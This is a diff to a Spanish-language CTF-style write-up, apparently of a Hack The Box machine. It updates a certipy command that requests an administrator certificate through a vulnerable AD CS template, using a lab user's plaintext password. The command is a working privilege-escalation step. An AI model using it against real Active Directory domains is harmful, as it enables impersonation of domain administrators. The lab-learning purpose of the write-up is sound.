@@ -199,7 +199,7 @@ esto nos permite identificar las plantillas vulnerables. esta vulnerabilidad se 
 
 Con este comando vamos a generar una solicitud de certificado para el usuario "ryan.cooper", con el objetivo de solicitar un certificado UPN "administrator", y utilizando la plantilla "UserAuthentication". dentro del Active Directory, y la CA utilizada para firmar el certificado es "sequel-dc-ca".
 ```python
-certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
+certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
 ```
 ![[Pasted image 20240329163011.png]]
 
